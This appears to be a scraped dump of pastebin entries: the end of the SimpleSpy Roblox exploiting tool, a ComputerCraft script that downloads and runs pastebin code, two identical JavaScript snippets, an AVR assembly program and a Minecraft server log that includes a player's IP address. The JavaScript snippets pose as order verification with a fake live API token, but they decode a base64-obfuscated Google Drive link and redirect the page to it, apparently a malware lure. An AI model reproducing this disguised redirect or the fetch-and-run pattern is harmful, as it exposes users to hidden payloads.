	return ""Click to exclude all remotes with this name.\nExcluding a remote makes SimpleSpy ignore it, but it will continue to be usable.""
end, function()
	if selected then
		blacklist[selected.Name] = true
		TextLabel.Text = ""Excluded!""
	end
end)

--- clears blacklist
newButton(""Clr Blacklist"", function()
	return ""Click to clear the blacklist.\nExcluding a remote makes SimpleSpy ignore it, but it will continue to be usable.""
end, function()
	blacklist = {}
	TextLabel.Text = ""Blacklist cleared!""
end)

--- Prevents the selected.Log Remote from firing the server (still logged)
newButton(""Block (i)"", function()
	return ""Click to stop this remote from firing.\nBlocking a remote won't remove it from SimpleSpy logs, but it will not continue to fire the server.""
end, function()
	if selected then
		if selected.Remote.remote then
			blocklist[selected.Remote.remote] = true
			TextLabel.Text = ""Excluded!""
		else
			TextLabel.Text = ""Error! Instance may no longer exist, try using Block (n).""
		end
	end
end)

--- Prevents all remotes from firing that share the same name as the selected.Log remote from the RemoteSpy (still logged)
newButton(""Block (n)"", function()
	return ""Click to stop remotes with this name from firing.\nBlocking a remote won't remove it from SimpleSpy logs, but it will not continue to fire the server.""
end, function()
	if selected then
		blocklist[selected.Name] = true
		TextLabel.Text = ""Excluded!""
	end
end)

--- clears blacklist
newButton(""Clr Blocklist"", function()
	return ""Click to stop blocking remotes.\nBlocking a remote won't remove it from SimpleSpy logs, but it will not continue to fire the server.""
end, function()
	blocklist = {}
	TextLabel.Text = ""Blocklist cleared!""
end)

--- Attempts to decompile the source script
newButton(""Decompile"", function()
	return ""Attempts to decompile source script\nWARNING: Not super reliable, nil == could not find""
end, function()
	if selected then
		if selected.Source then
			codebox:setRaw(decompile(selected.Source))
			TextLabel.Text = ""Done!""
		else
			TextLabel.Text = ""Source not found!""
		end
	end
end)

newButton(""Disable Info"", function()
	return string.format(
		""[%s] Toggle function info (because it can cause lag in some games)"",
		funcEnabled and ""ENABLED"" or ""DISABLED""
	)
end, function()
	funcEnabled = not funcEnabled
	TextLabel.Text = string.format(
		""[%s] Toggle function info (because it can cause lag in some games)"",
		funcEnabled and ""ENABLED"" or ""DISABLED""
	)
end)

newButton(""Autoblock"", function()
	return string.format(
		""[%s] [BETA] Intelligently detects and excludes spammy remote calls from logs"",
		autoblock and ""ENABLED"" or ""DISABLED""
	)
end, function()
	autoblock = not autoblock
	TextLabel.Text = string.format(
		""[%s] [BETA] Intelligently detects and excludes spammy remote calls from logs"",
		autoblock and ""ENABLED"" or ""DISABLED""
	)
	history = {}
	excluding = {}
end)

newButton(""CallingScript"", function()
	return string.format(
		""[%s] [UNSAFE] Uses 'getcallingscript' to get calling script for Decompile and GetScript. Much more reliable, but opens up SimpleSpy to detection and/or instability."",
		useGetCallingScript and ""ENABLED"" or ""DISABLED""
	)
end, function()
	useGetCallingScript = not useGetCallingScript
	TextLabel.Text = string.format(
		""[%s] [UNSAFE] Uses 'getcallingscript' to get calling script for Decompile and GetScript. Much more reliable, but opens up SimpleSpy to detection and/or instability."",
		useGetCallingScript and ""ENABLED"" or ""DISABLED""
	)
end)

newButton(""KeyToString"", function()
	return string.format(
		""[%s] [BETA] Uses an experimental new function to replicate Roblox's behavior when a non-primitive type is used as a key in a table. Still in development and may not properly reflect tostringed (empty) userdata."",
		keyToString and ""ENABLED"" or ""DISABLED""
	)
end, function()
	keyToString = not keyToString
	TextLabel.Text = string.format(
		""[%s] [BETA] Uses an experimental new function to replicate Roblox's behavior when a non-primitive type is used as a key in a table. Still in development and may not properly reflect tostringed (empty) userdata."",
		keyToString and ""ENABLED"" or ""DISABLED""
	)
end)

newButton(""ToggleReturnValues"", function()
	return string.format(
		""[%s] [EXPERIMENTAL] Enables recording of return values for 'GetReturnValue'\n\nUse this method at your own risk, as it could be detectable."",
		recordReturnValues and ""ENABLED"" or ""DISABLED""
	)
end, function()
	recordReturnValues = not recordReturnValues
	TextLabel.Text = string.format(
		""[%s] [EXPERIMENTAL] Enables recording of return values for 'GetReturnValue'\n\nUse this method at your own risk, as it could be detectable."",
		recordReturnValues and ""ENABLED"" or ""DISABLED""
	)
end)

newButton(""GetReturnValue"", function()
	return ""[Experimental] If 'ReturnValues' is enabled, this will show the recorded return value for the RemoteFunction (if available).""
end, function()
	if selected then
		codebox:setRaw(SimpleSpy:ValueToVar(selected.ReturnValue, ""returnValue""))
	end
end)"
qtc3ee4V,ServerStartupFile,DragonFromSpace,Lua,Monday 31st of March 2025 07:11:08 AM CDT,"--run main file from pastebin
if fs.exists(""MainServer.lua"") then
    fs.delete(""MainServer.lua"")
end

shell.run(""pastebin"", ""get"", ""5a762azh"", ""MainServer.lua"")
shell.run(""MainServer.lua"")"
XwztYmgN,Untitled,robloxhack212,JavaScript,Monday 31st of March 2025 07:02:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/461/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4K7gdkAu,Untitled,sombruxo,6502 TASM/64TASS,Monday 31st of March 2025 06:51:53 AM CDT,"/*
 * ToUpper_USART0.asm
 *
 *  Created: 21/03/2014 15:51:30
 *   Author: Administrador
 */ 
 .DEF temp = R16  ;temporary register definition
 .EQU lowercase_a = 97  ;ASCII for 'a'
 .EQU lowercase_z = 122 ;ASCII for 'z'
 .EQU TOUPPER = 32 ;to be subtracted from the lowercase to get the uppercase
 .EQU Clock = 16000000 ;processor’s clock frequency, Hz
 .EQU Baud = 9600 ;desired serial port baud rate (bits per second)
 .EQU UBRRvalue = Clock/(Baud*16) -1 ;calculates value to be put in UBRR0H:L

 
 .CSEG
 .ORG 0x00000 ;reset interrupt vector
      jmp RESET
 .ORG URXCaddr ; 0x00024  -> interrupt vectors for USART0 
      jmp USART0_reception_completed

.ORG INT_VECTORS_SIZE ;leave room for IRQ vectors
RESET:
	;configure USART0
	RCALL init_USART0
	SEI ;enable interrupts globally
Loop:
    ;nothing to do here, just be alive
	NOP
    rjmp Loop
;------- initialize USART0 as 9600baud, asynchronous, 8 data bits, 1 stop bit, no parity -----
init_USART0:
	PUSH R16
	LDI R16, LOW(UBRRvalue)
	STS UBRR0L, R16   ;load the low byte
	LDI R16, HIGH(UBRRvalue)
	STS UBRR0H, R16   ;load the low byte
	; enable receive and transmit, enable USART0 interrupts (UDR empty, Tx finished, Rx finished)
	LDI R16, (1<<RXEN0)|(1<< TXEN0)|(0<<UDRIE0)|(0<< TXCIE0)|(1<< RXCIE0)
	STS UCSR0B, R16 ;set control register UCSR0B with the corresponding bits
	; configure USART 0 as asynchronous, set frame format: 8 data bits, 1 stop bit, no parity
	LDI R16, (0<<UMSEL00) |(1<<UCSZ01)|(1<< UCSZ00) |(0<< USBS0)|(0<<UPM01)|(0<< UPM00)
	STS UCSR0C, R16 ;set control register UCSR0C with the corresponding bits
	POP R16
	RET

;----USART0_reception_completed handler --------------------------------------------------
;--- 
USART0_reception_completed:
 	PUSH temp ;this handler routine will be automatically called every 61msec (in this example)
	IN temp, SREG ;Backup SREG. MANDATORY in interrupt handler routines
	PUSH temp
	
	;do the desired periodic task here
	LDS temp, UDR0  ;pick up the byte received and do anything with it 
	CPI temp,lowercase_a ;'a'
	BRLT USART0_reception_cont ;not a lowercase letter
	CPI temp,lowercase_z+1 ;'z'+1
	BRGE USART0_reception_cont ;not an lowercase letter
	SUBI temp, TOUPPER ;change to Uppercase
	STS UDR0, temp  ;transmits the [modified] byte
 USART0_reception_cont:

	POP temp
	OUT SREG, temp  ;Recover SREG from the previous backup
	POP temp
	RETI ;RETI is MANDATORY when returning from an interrupt handling routine

.EXIT

"
pDPmjZHv,Products.js,reflezzzz,JavaScript,Monday 31st of March 2025 06:47:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/073/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TdFwg9ZR,Untitled,JustCheburek,Apache Log,Monday 31st of March 2025 06:35:20 AM CDT,"[14:04:18] [ServerMain/INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.6+7-Ubuntu-124.04.1; Ubuntu null) on Linux 6.8.0-55-generic (amd64)
[14:04:18] [ServerMain/INFO]: [bootstrap] Loading Paper 1.21-127-master@4e6a2a1 (2024-08-07T12:50:10Z) for Minecraft 1.21
[14:04:18] [ServerMain/INFO]: [PluginInitializerManager] Initializing plugins...
[14:04:21] [ServerMain/INFO]: [PluginInitializerManager] Initialized 31 plugins
[14:04:21] [ServerMain/INFO]: [PluginInitializerManager] Paper plugins (3):
 - Akropolis (1.8.1), FancyHolograms (2.4.2), FancyNpcs (2.4.1)
[14:04:21] [ServerMain/INFO]: [PluginInitializerManager] Bukkit plugins (28):
 - AdvancedPortals (2.2.1), Backuper (3.2.1b), ConditionalEvents (4.61.1), CustomizablePlayerModels (0.6.21a), DisableJoinMessage (1.0), Duels (2.6), FastAsyncWorldEdit (2.11.1), FileCleaner (s3.0.0), GSit (1.12.1), HeadsPlus (7.1.5), LuckPerms (5.4.151), MoonPillars (5.2.2), NoChatReports (2.3.0), PlaceholderAPI (2.11.6), PlasmoVoice (2.1.3), PlugManX (2.4.1), ProtocolLib (5.3.0), TAB-Bridge (6.0.1), Typewriter (0.7.0), UltraCosmetics (3.10.1-RELEASE), Vault (1.7.3-b131), ViaBackwards (5.3.1), ViaVersion (5.3.1), WorldGuard (7.0.12+829a4a4), packetevents (2.7.0), pv-addon-discs (1.1.3), pv-addon-lavaplayer-lib (1.1.2), pv-addon-sculk (1.1.0)
[14:04:24] [ServerMain/INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]
[14:04:26] [ServerMain/INFO]: Loaded 1290 recipes
[14:04:26] [ServerMain/INFO]: Loaded 1399 advancements
[14:04:26] [Server thread/INFO]: Starting minecraft server version 1.21
[14:04:26] [Server thread/INFO]: Loading properties
[14:04:26] [Server thread/INFO]: This server is running Paper version 1.21-127-master@4e6a2a1 (2024-08-07T12:50:10Z) (Implementing API version 1.21-R0.1-SNAPSHOT)
[14:04:27] [Server thread/INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling
[14:04:27] [Server thread/INFO]: Using 1 threads for Netty based IO
[14:04:27] [Server thread/INFO]: Server Ping Player Sample Count: 12
[14:04:27] [Server thread/INFO]: [ChunkTaskScheduler] Chunk system is using 1 I/O threads, 1 worker threads, and population gen parallelism of 1 threads
[14:04:28] [Server thread/INFO]: Default game type: ADVENTURE
[14:04:28] [Server thread/INFO]: Generating keypair
[14:04:28] [Server thread/INFO]: Starting Minecraft server on *:25440
[14:04:28] [Server thread/INFO]: Using epoll channel type
[14:04:28] [Server thread/INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.
[14:04:28] [Server thread/INFO]: Paper: Using OpenSSL 3.0.x (Linux x86_64) cipher from Velocity.


[14:04:56] [Server thread/INFO]: [MoonPillars] Enabling MoonPillars v5.2.2
[14:04:56] [Server thread/INFO]:  
[14:04:56] [Server thread/INFO]: ╭━╮╭━╮╱╱╱╱╱╱╱╱╭━━━╮╭╮╱╱╱╱╱╱╭━━━╮╭╮╱╱╱╱╱╭╮
[14:04:56] [Server thread/INFO]: ┃┃╰╯┃┃╱╱╱╱╱╱╱╱┃╭━╮┣╯╰╮╱╱╱╱╱┃╭━╮┣╯╰╮╱╱╱╱┃┃
[14:04:56] [Server thread/INFO]: ┃╭╮╭╮┣━━┳━━┳━╮┃╰━━╋╮╭╋━━┳━╮┃╰━━╋╮╭╋╮╭┳━╯┣┳━━┳━━╮
[14:04:56] [Server thread/INFO]: ┃┃┃┃┃┃╭╮┃╭╮┃╭╮╋━━╮┃┃┃┃╭╮┃╭╯╰━━╮┃┃┃┃┃┃┃╭╮┣┫╭╮┃━━┫
[14:04:56] [Server thread/INFO]: ┃┃┃┃┃┃╰╯┃╰╯┃┃┃┃╰━╯┃┃╰┫╭╮┃┃╱┃╰━╯┃┃╰┫╰╯┃╰╯┃┃╰╯┣━━┃
[14:04:56] [Server thread/INFO]: ╰╯╰╯╰┻━━┻━━┻╯╰┻━━━╯╰━┻╯╰┻╯╱╰━━━╯╰━┻━━┻━━┻┻━━┻━━╯
[14:04:56] [Server thread/INFO]:  
[14:04:56] [Server thread/INFO]: ╭━╮╭━╮╱╱╱╱╱╱╱╱╭━━━╮╭╮╭╮
[14:04:56] [Server thread/INFO]: ┃┃╰╯┃┃╱╱╱╱╱╱╱╱┃╭━╮┃┃┃┃┃
[14:04:56] [Server thread/INFO]: ┃╭╮╭╮┣━━┳━━┳━╮┃╰━╯┣┫┃┃┃╭━━┳━┳━━╮
[14:04:56] [Server thread/INFO]: ┃┃┃┃┃┃╭╮┃╭╮┃╭╮┫╭━━╋┫┃┃┃┃╭╮┃╭┫━━┫
[14:04:56] [Server thread/INFO]: ┃┃┃┃┃┃╰╯┃╰╯┃┃┃┃┃╱╱┃┃╰┫╰┫╭╮┃┃┣━━┃
[14:04:56] [Server thread/INFO]: ╰╯╰╯╰┻━━┻━━┻╯╰┻╯╱╱╰┻━┻━┻╯╰┻╯╰━━╯
[14:04:56] [Server thread/INFO]:  
[14:04:56] [Server thread/INFO]: MoonPillars 5.2.2
[14:04:56] [Server thread/INFO]: Made with love by kloppie74!
[14:04:56] [Server thread/INFO]: Report issues on the official discord!
[14:04:56] [Server thread/INFO]: https://discord.gg/Ya6NwdEMd6
[14:04:56] [Server thread/INFO]: 
[14:04:56] [Server thread/INFO]: [MoonPillars] Loaded 0 menu configurations.
[14:04:56] [Server thread/INFO]: [MoonPillars] Loaded 0 menu configurations.
[14:04:56] [Server thread/INFO]: [PlaceholderAPI] Successfully registered internal expansion: mpa [5.0.0]
[14:04:56] [Server thread/INFO]: Starting preloading worlds!
[14:04:56] [Server thread/INFO]: Found some worlds! Loading them!
[14:04:56] [Server thread/INFO]: 
[14:04:56] [Server thread/INFO]: Preparing start region for dimension minecraft:mini-clouds-1
[14:04:56] [Server thread/INFO]: Time elapsed: 121 ms
[14:04:56] [Server thread/INFO]: [WorldGuard] (Mini-clouds-1) TNT ignition is PERMITTED.
[14:04:56] [Server thread/INFO]: [WorldGuard] (Mini-clouds-1) Lighters are PERMITTED.
[14:04:56] [Server thread/INFO]: [WorldGuard] (Mini-clouds-1) Lava fire is PERMITTED.
[14:04:56] [Server thread/INFO]: [WorldGuard] (Mini-clouds-1) Fire spread is UNRESTRICTED.
[14:04:56] [Server thread/INFO]: [WorldGuard] Loaded configuration for world 'Mini-clouds-1'
[14:04:57] [Server thread/INFO]: Loaded world correctly: Mini-clouds-1
[14:04:57] [Server thread/INFO]: Preparing start region for dimension minecraft:mini-clouds-2
[14:04:57] [Server thread/INFO]: Time elapsed: 60 ms
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-2) TNT ignition is PERMITTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-2) Lighters are PERMITTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-2) Lava fire is PERMITTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-2) Fire spread is UNRESTRICTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] Loaded configuration for world 'Mini-clouds-2'
[14:04:57] [Server thread/INFO]: Loaded world correctly: Mini-clouds-2
[14:04:57] [Server thread/INFO]: Preparing start region for dimension minecraft:mini-clouds-3
[14:04:57] [Server thread/INFO]: Time elapsed: 72 ms
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-3) TNT ignition is PERMITTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-3) Lighters are PERMITTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-3) Lava fire is PERMITTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] (Mini-clouds-3) Fire spread is UNRESTRICTED.
[14:04:57] [Server thread/INFO]: [WorldGuard] Loaded configuration for world 'Mini-clouds-3'
[14:04:57] [Server thread/INFO]: Loaded world correctly: Mini-clouds-3
[14:04:57] [Server thread/INFO]: [Typewriter] Enabling Typewriter v0.7.0
[14:04:57] [Server thread/INFO]: [CommandAPI] Hooked into Paper ServerResourcesReloadedEvent


[14:05:10] [Server thread/INFO]: Done (52.608s)! For help, type ""help""
[14:05:10] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 4354ms or 87 ticks behind
[14:05:10] [Server thread/INFO]: Timings Reset
[14:05:10] [Server thread/INFO]: [HeadsPlus] Avengers, assemble!
[14:05:33] [User Authenticator #0/INFO]: UUID of player JustCheburek is 168fa541-313e-44b2-beaa-5bebf9595e28
[14:05:36] [Server thread/ERROR]: Could not pass event PlayerJoinEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnJoin(MoonLab.java:98) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor202.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.placeNewPlayer(PlayerList.java:347) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConfigurationPacketListenerImpl.handleConfigurationFinished(ServerConfigurationPacketListenerImpl.java:173) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:22) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:13) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:56) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:05:36] [Server thread/INFO]: [NoChatReports] Setting up player: JustCheburek
[14:05:37] [Server thread/INFO]: JustCheburek[/109.126.59.118:36460] logged in with entity id 1 at ([world]-75.5, 111.0, -16.5)
[14:05:44] [Server thread/INFO]: JustCheburek issued server command: /forcestart
[14:05:58] [Server thread/INFO]: JustCheburek issued server command: /joingame clouds
[14:05:58] [Server thread/ERROR]: Command exception: /joingame clouds
org.bukkit.command.CommandException: Unhandled exception executing command 'joingame' in plugin MoonPillars v5.2.2
	at org.bukkit.command.PluginCommand.execute(PluginCommand.java:47) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
Caused by: java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveGameLobbyItems(InventoryItemAPI.java:101) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.JoinFinalGame(GameManager.java:251) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.joinGame(GameManager.java:125) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.JoinGameCMD.onCommand(JoinGameCMD.java:56) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at org.bukkit.command.PluginCommand.execute(PluginCommand.java:45) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	... 27 more
[14:06:19] [Server thread/INFO]: JustCheburek issued server command: /forcestart
[14:06:57] [Server thread/INFO]: JustCheburek issued server command: /joingame
[14:06:59] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:07:02] [Server thread/INFO]: JustCheburek issued server command: /joingame clouds
[14:07:14] [Server thread/WARN]: No config found for player: JustCheburek
[14:07:14] [Server thread/INFO]: JustCheburek lost connection: Disconnected
[14:07:14] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
